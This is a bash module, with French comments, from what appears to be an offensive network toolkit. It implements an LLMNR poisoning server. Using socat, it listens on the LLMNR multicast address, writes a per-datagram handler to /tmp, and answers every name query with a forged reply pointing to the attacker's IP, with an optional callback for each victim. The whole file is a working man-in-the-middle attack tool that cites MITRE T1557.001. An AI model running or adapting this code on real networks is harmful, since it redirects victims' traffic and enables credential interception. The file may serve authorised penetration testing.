#!/usr/bin/env bash
#
# lib/protocol/llmnr/server.sh — Serveur LLMNR offensif (pure bash + socat)
#
# Écoute sur 224.0.0.252:5355 (UDP multicast) via socat et répond à toutes
# les requêtes A/AAAA avec l'IP de l'attaquant (poisoning LLMNR).
#
# Chaque datagramme reçu est traité par un handler bash (EXEC:bash) lancé par
# socat en mode fork. Le handler lit le payload sur stdin (via od), parse la
# requête, forge la réponse et la restitue sur stdout pour que socat la renvoie
# à l'expéditeur.
#
# Dépendances : core/log, protocol/llmnr/message, socat (système)
#
# Référence : RFC 4795, MITRE ATT&CK T1557.001
#
# ─────────────────────────────────────────────────────────────────────────────

[[ -n "${_ENSH_PROTO_LLMNR_SERVER:-}" ]] && return 0
readonly _ENSH_PROTO_LLMNR_SERVER=1

ensh::import core/log
ensh::import protocol/llmnr/message

declare -g _LLMNR_SERVER_PID=""
declare -g _LLMNR_SERVER_HANDLER=""

# ── Helpers ──────────────────────────────────────────────────────────────────

# _llmnr_ip4_to_hex <ip_dotted> <var_out>
_llmnr_ip4_to_hex() {
    local ip="$1"
    local -n _llmnr_ith_out="$2"
    local IFS='.'
    read -r _a _b _c _d <<< "${ip}"
    printf -v _llmnr_ith_out '%02X%02X%02X%02X' "${_a}" "${_b}" "${_c}" "${_d}"
}

# ── Serveur ───────────────────────────────────────────────────────────────────

# llmnr::server::start <iface> <attacker_ip> [callback_cmd]
#
# Lance socat en arrière-plan sur UDP/5355 avec membership multicast.
# Pour chaque requête reçue, forge une réponse A/AAAA avec <attacker_ip>.
#
# <callback_cmd> : commande bash optionnelle appelée avec (name src_ip) ;
#                  doit être une commande exécutable (pas une fonction Ensh).
llmnr::server::start() {
    local iface="$1"
    local attacker_ip="$2"
    local callback_cmd="${3:-}"

    if [[ -n "${_LLMNR_SERVER_PID:-}" ]] && kill -0 "${_LLMNR_SERVER_PID}" 2>/dev/null; then
        log::error "llmnr::server : déjà démarré (pid=${_LLMNR_SERVER_PID})"
        return 1
    fi

    if ! command -v socat >/dev/null 2>&1; then
        log::error "llmnr::server : socat requis pour l'écoute UDP multicast"
        return 1
    fi

    local mcast="${ENSH_LLMNR_MCAST_IP:-${LLMNR_MCAST_V4}}"
    local -i port="${ENSH_LLMNR_PORT:-${LLMNR_PORT}}"
    local -i ttl="${ENSH_LLMNR_TTL:-${LLMNR_DEFAULT_TTL}}"

    local attacker_hex
    _llmnr_ip4_to_hex "${attacker_ip}" attacker_hex

    # Résoudre ENSH_ROOT à partir du chemin de ce script
    local _ensh_root
    _ensh_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"

    # ── Handler bash écrit dans un fichier temporaire ─────────────────────────
    # socat (fork) exécute ce script pour chaque datagramme reçu :
    #   stdin  = payload UDP brut
    #   stdout = réponse UDP à renvoyer à l'expéditeur
    #   env    = SOCAT_PEERADDR / SOCAT_PEERPORT (fournis par socat)
    local handler
    handler="$(mktemp /tmp/.llmnr_handler_XXXXXX.sh)"
    chmod 700 "${handler}"
    _LLMNR_SERVER_HANDLER="${handler}"

    # Heredoc non-quoté : les variables du parent (attacker_hex, ttl, etc.)
    # sont expandées à l'écriture du fichier. Les \${ sont écrits littéralement
    # pour être évalués à l'exécution du handler.
    cat > "${handler}" << HANDLER_EOF
#!/usr/bin/env bash
set -uo pipefail

# Lire le payload UDP (octets bruts) depuis stdin → hex
_hex=\$(od -An -tx1 | tr -d ' \n' | tr '[:lower:]' '[:upper:]')
[[ -n "\${_hex}" ]] || exit 0

# Charger Ensh et le module LLMNR
source "${_ensh_root}/ensh.sh"
ensh::import protocol/llmnr/message

# Parser la requête
declare -A _q
llmnr::message::parse "\${_hex}" _q || exit 0

# Ignorer les réponses (QR=1)
[[ "\${_q[qr]:-1}" == "0" ]] || exit 0
[[ -n "\${_q[question_name]:-}" ]] || exit 0

# Forger la réponse avec l'IP de l'attaquant
declare _resp
llmnr::message::build_response _resp "\${_q[txid]}" "\${_q[question_name]}" "${attacker_hex}" "${ttl}" || exit 0

# Écrire les octets bruts de la réponse sur stdout (socat les renvoie)
for (( _i = 0; _i < \${#_resp}; _i += 2 )); do
    printf "\\\\x\${_resp:\${_i}:2}"
done

# Callback optionnel
if [[ -n "${callback_cmd}" && -n "\${SOCAT_PEERADDR:-}" ]]; then
    ${callback_cmd} "\${_q[question_name]}" "\${SOCAT_PEERADDR}" &>/dev/null &
fi
HANDLER_EOF

    # ── Lancement socat ───────────────────────────────────────────────────────
    # UDP4-RECVFROM:port,fork : reçoit les datagrammes, forke pour chaque un.
    # ip-add-membership : rejoint le groupe multicast (seulement si iface fournie).
    # reuseaddr : permet de redémarrer sans attendre TIME_WAIT.
    local bind_ip="${ENSH_LLMNR_BIND_IP:-0.0.0.0}"
    local socat_in="UDP4-RECVFROM:${port},bind=${bind_ip},reuseaddr,fork"
    if [[ -n "${iface}" ]]; then
        socat_in+=",ip-add-membership=${mcast}:${iface}"
    fi

    socat "${socat_in}" "EXEC:bash ${handler}" >/dev/null 2>&1 &
    local -i pid=$!

    sleep 0.3
    if ! kill -0 "${pid}" 2>/dev/null; then
        wait "${pid}" 2>/dev/null || true
        rm -f "${handler}"
        _LLMNR_SERVER_HANDLER=""
        log::error "llmnr::server : échec du démarrage (vérifier les droits sur :${port})"
        return 1
    fi

    _LLMNR_SERVER_PID="${pid}"
    log::info "llmnr : serveur démarré — ${bind_ip}:${port} iface=${iface:-any} attacker=${attacker_ip} (pid=${pid})"
}

# llmnr::server::stop
llmnr::server::stop() {
    if [[ -z "${_LLMNR_SERVER_PID:-}" ]]; then
        return 0
    fi

    kill "${_LLMNR_SERVER_PID}" 2>/dev/null || true
    wait "${_LLMNR_SERVER_PID}" 2>/dev/null || true
    log::debug "llmnr : serveur arrêté (pid=${_LLMNR_SERVER_PID})"

    [[ -n "${_LLMNR_SERVER_HANDLER:-}" ]] && rm -f "${_LLMNR_SERVER_HANDLER}"
    _LLMNR_SERVER_PID=""
    _LLMNR_SERVER_HANDLER=""
}
